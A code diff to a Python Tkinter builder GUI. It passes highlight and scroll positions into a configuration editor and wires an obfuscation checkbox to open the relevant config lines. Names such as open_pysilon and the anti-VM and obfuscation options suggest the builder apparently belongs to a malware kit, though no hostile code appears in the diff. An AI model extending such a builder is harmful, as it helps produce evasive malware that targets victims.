@@ -312,7 +312,7 @@ class Builder:
         if close != False:
             close.destroy()
 
-    def configuration_editor(self, file, highlight=['0.0', '1.0']):
+    def configuration_editor(self, file, highlight=['0.0', '1.0'], scroll='1.0'):
         cfg_editor = tk.Tk()
         cfg_editor.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['width']) + 'x' + str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['config_editor']['geometry']['height']))
 
@@ -336,9 +336,9 @@ class Builder:
         with open(file, 'r', encoding='utf-8') as configuration_file:
             self.text.insert('1.0', ''.join(configuration_file.readlines()))
 
-        self.text.tag_add('highlight', '34.0', '38.0')
+        self.text.tag_add('highlight', highlight[0], highlight[1])
         self.text.tag_configure('highlight', background='#9effb8', foreground='black')
-        self.text.see(tk.END)
+        self.text.see(scroll)
 
         btn_savecfg = tk.Button(
             frame,
@@ -360,7 +360,9 @@ class Builder:
     def double_click_settings(self, context):
         if time.time() - self.time_check < 0.5:
             if context == 'antivm':
-                self.configuration_editor('resources/assets/configuration.tmp')
+                self.configuration_editor('resources/assets/configuration.tmp', ['75.0', '79.0'], '76.0')
+            elif context == 'obfuscation':
+                self.configuration_editor('resources/assets/configuration.tmp', ['34.0', '71.0'], '32.0')
         self.time_check = time.time()
 
     def open_pysilon(self):
@@ -964,6 +966,7 @@ class Builder:
                 'Consolas', 
                 builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
             variable=self.cbvar_obfuscation,
+            command=lambda:self.double_click_settings('obfuscation'),
             onvalue=True,
             offvalue=False
         )
